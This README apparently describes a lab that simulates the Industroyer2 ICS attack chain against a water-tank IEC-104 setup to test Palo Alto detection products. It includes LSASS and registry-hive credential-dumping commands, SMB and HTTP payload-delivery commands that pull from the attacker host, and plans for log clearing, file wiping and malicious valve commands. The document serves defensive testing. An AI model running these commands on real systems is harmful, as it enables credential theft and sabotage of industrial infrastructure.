# mrhOTshOT Project Overview

> **Complete Industroyer2 Attack Simulation for Palo Alto Networks Security Testing**

## What is mrhOTshOT?

mrhOTshOT is a comprehensive cybersecurity lab that simulates the **Industroyer2 malware attack chain** targeting industrial control systems (ICS/OT). The project replicates the 2022 attack on Ukrainian power infrastructure, adapted for a water tank control system using the IEC-104 protocol.

**Primary Purpose**: Test and demonstrate Palo Alto Networks security products:
- XSIAM (attack chain correlation)
- Cortex XDR (endpoint detection)
- Device Security (network-based detection)
- WildFire (malware analysis)

## Quick Start

```bash
# 1. Clone repository on all machines
git clone <repository-url> ~/mrhOTshOT/final_things/iec104_water_tank
cd ~/mrhOTshOT/final_things/iec104_water_tank

# 2. Run setup script (machine-specific)
cd machines/<attacker|router|hmi|plc>
sudo ./setup.sh  # or setup.ps1 on Windows HMI

# 3. Start services (Router and PLC)
cd execution
./start_router.sh  # on Router
./start_plc.sh     # on PLC

# 4. Run attack (Attacker machine)
cd execution
./run_attack.sh
```

## Repository Structure

```
mrhOTshOT/
├── README.md                      # Main guide with quick start
├── NETWORK_TOPOLOGY.md            # Network architecture and IP addresses
├── CUSTOM_DETECTION_RULES.md      # Detection rules for Palo Alto products
├── PROJECT_OVERVIEW.md            # This file
│
├── machines/                      # Machine-specific code
│   ├── attacker/                  # Kali/Ubuntu attacker (192.168.0.11)
│   │   ├── setup.sh              # Install attack tools
│   │   ├── requirements.txt      # Python dependencies
│   │   └── scripts/              # Attack scripts
│   │       ├── MASTER_ATTACK_ORCHESTRATOR.py  # Main orchestrator (7 phases)
│   │       ├── 00_phishing_server.py          # Phase 1 alternative
│   │       ├── 01_router_exploit.py           # Phase 1: Initial access
│   │       ├── 03_lateral_movement.py         # Phase 4: Lateral movement
│   │       ├── 04_windows_payload.py          # Helper for payload creation
│   │       ├── 05_credential_dumper.py        # Phase 3: Credential theft
│   │       └── 06_file_transfer_all_methods.py # Phase 5: 4 transfer methods
│   │
│   ├── router/                    # Multi-homed router (192.168.0.13/192.168.1.4)
│   │   ├── setup.sh              # Setup vulnerable web server
│   │   ├── requirements.txt      # Python dependencies
│   │   └── vulnerable_router_server.py  # Intentionally vulnerable server
│   │
│   ├── hmi/                       # Windows HMI (192.168.1.55)
│   │   ├── setup.ps1             # Windows PowerShell setup
│   │   ├── setup.sh              # Alternative Linux/WSL setup
│   │   ├── requirements.txt      # Python dependencies
│   │   ├── hmi_clients/          # HMI client scripts
│   │   └── payload/              # Malware payload files
│   │       ├── industroyer2_characteristics.py  # Phase 6
│   │       └── perform_malware_simulations/
│   │           └── industroyer2_simulation.py   # Phase 7
│   │
│   └── plc/                       # PLC/RTU (192.168.1.6)
│       ├── setup.sh              # Setup water tank server
│       ├── requirements.txt      # Python dependencies
│       ├── server/               # IEC-104 server
│       │   └── iec104_server.py # Water tank simulation
│       └── common/               # Shared libraries
│
├── execution/                     # Execution scripts
│   ├── run_attack.sh             # Main attack execution
│   ├── start_router.sh           # Start router service
│   ├── start_plc.sh              # Start PLC service
│   └── reset_environment.sh      # Clean up after attack
│
├── docs/                          # Comprehensive documentation
│   ├── SETUP_GUIDE.md            # Step-by-step setup for beginners
│   ├── EXECUTION_GUIDE.md        # Attack execution and customization
│   └── TROUBLESHOOTING.md        # Common issues and solutions
│
├── libs/                          # Third-party libraries
│   └── c104-2.2.1/               # IEC-104 protocol library
│
├── requirements.txt               # Common Python dependencies
├── .gitignore                     # Git exclusions (credentials, logs, etc.)
├── verify_setup.sh               # Verify environment setup
└── collect_diagnostics.sh        # Collect debug information
```

## Network Architecture

```
         INTERNET
            |
    ┌───────┴───────┐
    │   Firewall    │ (Optional)
    └───────┬───────┘
            |
    ┌───────┴──────────────┐
    │  IT Network          │
    │  192.168.0.0/24      │
    └───────┬──────────────┘
            |
    ┌───────┼───────┐
    |       |       |
┌───▼───┐  Other   Corporate
│Attacker│ Systems Workstations
│ .0.11 │
└───────┘

    ┌───────────────────┐
    │  Multi-Homed      │
    │  Router           │
    │  .0.13 | .1.4     │
    └───────┬───────────┘
            |
    ┌───────┴──────────────┐
    │  OT Network          │
    │  192.168.1.0/24      │
    └───────┬──────────────┘
            |
    ┌───────┼────────┐
    |       |        |
┌───▼───┐ ┌▼────┐ ┌─▼──────┐
│  HMI  │ │Hist.│ │ Other  │
│ .1.55 │ │.1.27│ │  .1.x  │
└───┬───┘ └─────┘ └────────┘
    |
    | IEC-104 (2404)
    |
┌───▼────────┐
│  PLC/RTU   │
│Water Tank  │
│   .1.6     │
└────────────┘
```

## Attack Chain (7 Phases)

### Phase 1: Initial Access
**MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **Option A**: Exploit command injection in router web server (port 8080)
- **Option B**: Phishing server for credential capture
- **Detection**: Device Security (command injection signature), XSIAM (suspicious HTTP POST)

### Phase 2: Enumeration
**MITRE ATT&CK**: T1046 (Network Service Discovery)
- SSH to compromised router
- Execute nmap FROM router to scan OT network (192.168.1.0/24)
- Discover HMI, PLC, open ports
- **Detection**: Device Security (port scanning from router), XSIAM (unusual nmap execution)

### Phase 3: Credential Dumping
**MITRE ATT&CK**: T1003.001 (LSASS Memory), T1003.002 (Security Account Manager)
- **LSASS dump**: `rundll32.exe comsvcs.dll MiniDump`
- **Registry hives**: SAM, SECURITY, SYSTEM using `reg.exe save`
- Extract credentials with pypykatz
- **Detection**: Cortex XDR (30-50 alerts: LSASS access, registry dumps, credential tools)

### Phase 4: Lateral Movement
**MITRE ATT&CK**: T1021 (Remote Services)
- Pivot from IT network to OT network via router
- SMB/WinRM/RDP to HMI (192.168.1.55)
- Create staging directories
- **Detection**: Device Security (IT-to-OT boundary crossing - CRITICAL), XSIAM (unusual SMB)

### Phase 5: Payload Delivery (4 Methods)
**MITRE ATT&CK**: T1105 (Ingress Tool Transfer)

1. **SMB**: `smbclient` to admin shares
2. **HTTP**: Python web server + PowerShell download
3. **PowerShell In-Memory**: Base64 encoded transfer
4. **RDP**: xfreerdp with drive redirection + WMI copy

- **Detection**: All methods generate alerts (file transfers, PowerShell, RDP, LOLBins)

### Phase 6: Industroyer2 Characteristics
**MITRE ATT&CK**: T1489 (Service Stop), T1070.001 (Clear Windows Event Logs), T1485 (Data Destruction)
- Terminate SCADA processes
- Clear Security/System/Application event logs (anti-forensics)
- File destruction (CaddyWiper simulation)
- **Detection**: Cortex XDR (15-25 alerts: process termination, log clearing, file destruction)

### Phase 7: OT Attack
**MITRE ATT&CK**: T1486 (Data Encrypted for Impact), specific ICS TTPs
- Connect to PLC via IEC-104 (port 2404)
- Send malicious commands:
  - Open inlet valve (IOA 101)
  - Close outlet valve (IOA 102)
- Cause water tank overflow and explosion
- **Detection**: Device Security (IEC-104 anomalies), XSIAM (HMI-to-PLC anomaly)

## Expected Security Alerts

### XSIAM
- **Incident**: "Industroyer2 Attack Chain Detection"
- **Events**: 75-150 correlated events
- **Stages**: All 7 phases with MITRE ATT&CK mapping

### Cortex XDR (HMI)
- **Total Alerts**: 30-50
- **High Severity**:
  - LSASS Memory Access
  - Registry Hive Dumps (SAM, SECURITY, SYSTEM)
  - Event Log Clearing (Security, System, Application)
  - SCADA Process Termination
- **Medium Severity**:
  - Suspicious PowerShell execution
  - Remote file copy
  - WinRM execution from external host

### Device Security
- **Total Alerts**: 15-25
- **Critical**:
  - IT-to-OT boundary crossing
  - IEC-104 protocol anomaly
  - Command injection
- **High**:
  - Port scanning
  - SMB transfer to OT network
  - Unusual IEC-104 command sequence

### WildFire
- **Submissions**: 8-15 files
- **Files**:
  - PsExec.exe (LOLBin - Grayware)
  - payload.zip (Malware)
  - Python malware scripts (Malware)
  - LSASS dumps (Malware)

## Key Features

### Realistic Attack Simulation
- **NO shortcuts**: Actual LSASS dumps, real credential extraction, genuine protocol abuse
- **NO placeholders**: Real rundll32.exe, reg.exe, PsExec.exe execution
- **Real protocols**: IEC-104, SMB, RDP, WinRM, HTTP

### Maximum Alert Generation
- Designed to trigger every relevant detection across all Palo Alto products
- XSIAM attack chain correlation as Priority 1
- Comprehensive MITRE ATT&CK coverage

### Beginner-Friendly
- Step-by-step setup guides
- Machine-specific setup scripts
- Automated execution with pre-flight checks
- Comprehensive troubleshooting documentation

### Professional Grade
- Production-quality code
- Extensive logging (JSON + text)
- Modular design (run individual phases)
- Safety features (cleanup scripts, verification)

## File Transfer Methods Detail

All 4 methods are FULLY implemented:

### Method 1: SMB
```bash
smbclient //192.168.1.55/C$ -U operator%labpass123 -c "put payload.zip Temp\payload.zip"
```

### Method 2: HTTP
```bash
# Start server on attacker
python3 -m http.server 8000

# Download on HMI via WinRM
powershell.exe -Command "Invoke-WebRequest -Uri http://192.168.0.11:8000/payload.zip -OutFile C:\Temp\payload.zip"
```

### Method 3: PowerShell In-Memory
```bash
# Base64 encode file, send via WinRM, decode on target
# Executes in memory initially before writing to disk
```

### Method 4: RDP Drive Redirection
```bash
# Mount local directory via RDP
xfreerdp /v:192.168.1.55 /u:operator /p:labpass123 /drive:share,/local/path

# Copy from \\tsclient\share via WMI
powershell.exe -Command "Copy-Item \\tsclient\share\payload.zip C:\Temp\"
```

## Credentials Reference

| System | Username | Password | Purpose |
|--------|----------|----------|---------|
| Router | admin | admin | SSH, Web console |
| Router | operator | labpass123 | SSH |
| HMI | operator | labpass123 | RDP, SMB, WinRM |

## Important Files

### Attack Scripts
- `MASTER_ATTACK_ORCHESTRATOR.py` - Main orchestrator (759 lines)
- `05_credential_dumper.py` - ACTUAL credential dumping (NO placeholders)
- `06_file_transfer_all_methods.py` - All 4 transfer methods
- `industroyer2_characteristics.py` - Process kill + log deletion + CaddyWiper
- `industroyer2_simulation.py` - IEC-104 OT attack

### Setup Scripts
- `machines/attacker/setup.sh` - Install nmap, smbclient, impacket, etc.
- `machines/router/setup.sh` - Setup vulnerable web server + users
- `machines/plc/setup.sh` - Install c104, setup water tank service
- `machines/hmi/setup.ps1` - Enable RDP/SMB/WinRM, create user

### Execution Scripts
- `execution/run_attack.sh` - Main execution with pre-flight checks
- `execution/start_router.sh` - Start vulnerable router
- `execution/start_plc.sh` - Start water tank server
- `execution/reset_environment.sh` - Cleanup after attack

### Utility Scripts
- `verify_setup.sh` - Verify environment is correctly configured
- `collect_diagnostics.sh` - Collect debug information

### Documentation
- `README.md` - Quick start guide
- `docs/SETUP_GUIDE.md` - Complete setup (absolute beginners)
- `docs/EXECUTION_GUIDE.md` - Attack execution and customization
- `docs/TROUBLESHOOTING.md` - Common issues and solutions
- `NETWORK_TOPOLOGY.md` - Network architecture
- `CUSTOM_DETECTION_RULES.md` - Detection rules for Palo Alto

## Execution Modes

### 1. Full Automated
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --auto-yes
```
- No user interaction
- All 7 phases automatically
- Duration: 15-30 minutes

### 2. Interactive
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py
```
- Confirm each phase
- See detailed information
- Can skip or stop

### 3. Individual Phases
```bash
python3 MASTER_ATTACK_ORCHESTRATOR.py --phases 1,2,5
python3 MASTER_ATTACK_ORCHESTRATOR.py --start-from 4
```
- Test specific phases
- Resume from checkpoint

## Safety and Ethics

**WARNING**: This is a REAL attack simulation using ACTUAL exploit techniques.

### [!] Legal Usage Only
- Use ONLY in authorized lab environments
- Do NOT use against production systems
- Do NOT use against systems you don't own

### Security Considerations
- Isolate lab from production networks
- Change default credentials
- Monitor and control access
- Follow responsible disclosure

### Cleanup
- Run `reset_environment.sh` after testing
- Delete credential dumps
- Clear logs containing sensitive data
- Remove payloads from HMI

## Support and Resources

### Documentation
- [Quick Start](README.md)
- [Complete Setup Guide](docs/SETUP_GUIDE.md)
- [Execution Guide](docs/EXECUTION_GUIDE.md)
- [Troubleshooting](docs/TROUBLESHOOTING.md)
- [Network Topology](NETWORK_TOPOLOGY.md)
- [Detection Rules](CUSTOM_DETECTION_RULES.md)

### Verification
```bash
# Verify setup is correct
./verify_setup.sh

# Collect diagnostics for troubleshooting
./collect_diagnostics.sh
```

### Getting Help
1. Check TROUBLESHOOTING.md first
2. Review logs in `/tmp/mrhOTshOT/logs/`
3. Run `collect_diagnostics.sh`
4. Verify network connectivity
5. Ensure all setup scripts completed successfully

## Technology Stack

### Languages
- Python 3.8+
- Bash
- PowerShell

### Protocols
- IEC 60870-5-104 (IEC-104)
- SMB/CIFS
- RDP
- WinRM
- HTTP/HTTPS
- SSH

### Key Libraries
- `c104` - IEC-104 protocol
- `impacket` - SMB/WMI/PSEXEC
- `pypykatz` - Credential extraction
- `flask` - Web servers
- `pywinrm` - Windows remote management
- `paramiko` - SSH
- `pwntools` - Exploitation framework

### Tools
- nmap - Network reconnaissance
- smbclient - SMB file transfer
- xfreerdp - RDP client
- PsExec.exe - Microsoft Sysinternals (LOLBin)

## Credits and Attribution

Based on:
- **Industroyer2 malware** (2022 Ukraine attack)
- **MITRE ATT&CK Framework** (ICS techniques)
- **IEC 60870-5-104** standard
- **Microsoft Sysinternals** (PsExec)
- **Mimikatz/pypykatz** (credential dumping techniques)

## License

This project is for educational and authorized security testing purposes only.

---

**Ready to start?** → [README.md](README.md) → Quick Start

**Need detailed setup?** → [docs/SETUP_GUIDE.md](docs/SETUP_GUIDE.md)

**Questions?** → [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md)
